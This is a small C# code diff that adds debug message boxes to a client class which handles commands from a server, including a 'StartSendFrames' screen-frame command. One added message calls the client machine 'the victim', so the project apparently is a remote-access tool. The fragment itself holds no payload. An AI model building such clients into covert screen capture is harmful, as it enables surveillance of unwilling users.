@@ -167,6 +167,7 @@ namespace ExtremLink_Client.Classes
             {
                 List<object> message = this.GetTCPMessageFromClient();
                 string data = (string)message[2];
+                // MessageBox.Show($"type:{message[0]}, data:{data}");
 
                 switch (message[0])
                 {
@@ -245,6 +246,7 @@ namespace ExtremLink_Client.Classes
         {
             // Input: a string which represent a given frames command from the server.
             // Output: The function handles with the frames commands.
+            MessageBox.Show("Frames command message is now handled by the victim");
             switch (data)
             {
                 case "StartSendFrames":
